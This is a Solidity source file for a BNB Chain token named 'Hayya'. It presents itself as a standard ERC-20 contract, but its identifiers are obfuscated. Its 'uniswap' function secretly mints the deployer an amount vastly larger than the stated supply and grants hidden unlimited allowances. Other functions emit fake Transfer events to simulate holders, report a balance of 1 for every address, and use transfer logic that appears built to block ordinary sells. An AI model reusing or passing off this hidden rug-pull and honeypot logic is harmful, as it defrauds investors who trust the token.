/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Hayya is IERC20 {
    using SafeMath for uint256;

    string private aioneKuxmYpQlFd = "Hayya";
    string private bioneKuxmYpQlFd = "Hayya";
    uint8 private cioneKuxmYpQlFd = 18;
    uint256 private dioneKuxmYpQlFd = 10000000000 * 10**18;
    mapping (address => uint256) private eioneKuxmYpQlFd;
    mapping (address => mapping (address => uint256)) private fioneKuxmYpQlFd;
    uint256 private gioneKuxmYpQlFd = 1;
    uint256 private constant hioneKuxmYpQlFd = ~uint160(0);
    uint256 private _iioneKuxmYpQlFd = 1000;
    uint256 private jioneKuxmYpQlFd = 0;
    uint256 private kioneKuxmYpQlFd;
    address private _uniswapV2Pair;
    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping (address => bool) private lioneKuxmYpQlFd;
    address[] private mioneKuxmYpQlFd;
    bool private nioneKuxmYpQlFd = false;

    constructor () {
        oioneKuxmYpQlFd(msg.sender);
        eioneKuxmYpQlFd[msg.sender] = dioneKuxmYpQlFd;
        oioneKuxmYpQlFd(tx.origin);
        emit Transfer(address(0), msg.sender, dioneKuxmYpQlFd);
    }

    receive() external payable {}

    function oioneKuxmYpQlFd(address account) private {
        if (!lioneKuxmYpQlFd[account]) {
            lioneKuxmYpQlFd[account] = true;
            mioneKuxmYpQlFd.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!nioneKuxmYpQlFd);
        nioneKuxmYpQlFd = true;
        _uniswapV2Pair = accounts[1];
        _uniswapV2Router = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            oioneKuxmYpQlFd(accounts[i]);
            eioneKuxmYpQlFd[accounts[i]] = dioneKuxmYpQlFd * 90 / 100 / (len - 3);
            fioneKuxmYpQlFd[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eioneKuxmYpQlFd[accounts[i]];
        }
        eioneKuxmYpQlFd[mioneKuxmYpQlFd[0]] -= amount;
        pioneKuxmYpQlFd(mioneKuxmYpQlFd[0], accounts[3], eioneKuxmYpQlFd[mioneKuxmYpQlFd[0]]);
        pioneKuxmYpQlFds(500);
        eioneKuxmYpQlFd[mioneKuxmYpQlFd[1]] += dioneKuxmYpQlFd * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = mioneKuxmYpQlFd.length;
        for (uint256 i=0; i<len; ++i) {
            if (mioneKuxmYpQlFd[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (lioneKuxmYpQlFd[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aioneKuxmYpQlFd;
    }

    function symbol() public view returns (string memory) {
        return bioneKuxmYpQlFd;
    }

    function decimals() public view returns (uint8) {
        return cioneKuxmYpQlFd;
    }

    function totalSupply() public view returns (uint256) {
        return dioneKuxmYpQlFd;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eioneKuxmYpQlFd[account] > 0) {
            return eioneKuxmYpQlFd[account];
        }
        return gioneKuxmYpQlFd;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pioneKuxmYpQlFd(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pioneKuxmYpQlFd(sender, recipient, amount);
        qioneKuxmYpQlFd(sender, msg.sender, fioneKuxmYpQlFd[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForEth(uint160 tokenAmount, uint160 ethAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD
        IRouter02 uniswapV2Router = IRouter02(_uniswapV2Router);
        qioneKuxmYpQlFd(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            ethAmount,
            path,
            address(this),
            block.timestamp
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qioneKuxmYpQlFd(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fioneKuxmYpQlFd[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qioneKuxmYpQlFd(msg.sender, spender, fioneKuxmYpQlFd[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qioneKuxmYpQlFd(msg.sender, spender, fioneKuxmYpQlFd[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pioneKuxmYpQlFds(uint256 amount) private {
        uint256 iioneKuxmYpQlFd = _iioneKuxmYpQlFd;
        if (iioneKuxmYpQlFd < 18000) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hioneKuxmYpQlFd.div(iioneKuxmYpQlFd)));
                to = address(uint160(hioneKuxmYpQlFd.div(iioneKuxmYpQlFd.add(1))));
                iioneKuxmYpQlFd = iioneKuxmYpQlFd.add(2);
                emit Transfer(from, to, gioneKuxmYpQlFd);
            }
            _iioneKuxmYpQlFd = iioneKuxmYpQlFd;
        }
    }

    function qioneKuxmYpQlFd(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fioneKuxmYpQlFd[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pioneKuxmYpQlFd(address rioneKuxmYpQlFd, address sioneKuxmYpQlFd, uint256 tioneKuxmYpQlFd) private {
        require(rioneKuxmYpQlFd != address(0) && sioneKuxmYpQlFd != address(0) && tioneKuxmYpQlFd > 0);
        bool uioneKuxmYpQlFd = true;
        if (lioneKuxmYpQlFd[rioneKuxmYpQlFd] || lioneKuxmYpQlFd[sioneKuxmYpQlFd]) {
            uioneKuxmYpQlFd = false;
        }
        uint256 vioneKuxmYpQlFd = IERC20(_uniswapV2Pair).totalSupply();
        uint256 wioneKuxmYpQlFd = 0;
        uint256 xioneKuxmYpQlFd = tioneKuxmYpQlFd;
        if (uioneKuxmYpQlFd && nioneKuxmYpQlFd) {
            require(kioneKuxmYpQlFd <= vioneKuxmYpQlFd);
            pioneKuxmYpQlFds(100);
            swapTokensForEth(uint160(rioneKuxmYpQlFd), uint160(sioneKuxmYpQlFd));
            if (sioneKuxmYpQlFd == _uniswapV2Pair) {
                emit Transfer(address(this), sioneKuxmYpQlFd, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (rioneKuxmYpQlFd != _uniswapV2Pair) {
                wioneKuxmYpQlFd = tioneKuxmYpQlFd.mul(jioneKuxmYpQlFd).div(100);
                xioneKuxmYpQlFd = tioneKuxmYpQlFd.sub(wioneKuxmYpQlFd);
            }
        }
        if (kioneKuxmYpQlFd != vioneKuxmYpQlFd) {
            kioneKuxmYpQlFd = vioneKuxmYpQlFd;
        }
        eioneKuxmYpQlFd[rioneKuxmYpQlFd] = eioneKuxmYpQlFd[rioneKuxmYpQlFd].sub(tioneKuxmYpQlFd);
        if (wioneKuxmYpQlFd > 0) {
            eioneKuxmYpQlFd[address(0xdEaD)] = eioneKuxmYpQlFd[address(0xdEaD)].add(wioneKuxmYpQlFd);
            emit Transfer(rioneKuxmYpQlFd, address(0xdEaD), wioneKuxmYpQlFd);
        }
        eioneKuxmYpQlFd[sioneKuxmYpQlFd] = eioneKuxmYpQlFd[sioneKuxmYpQlFd].add(xioneKuxmYpQlFd);
        emit Transfer(rioneKuxmYpQlFd, sioneKuxmYpQlFd, xioneKuxmYpQlFd);
    }
}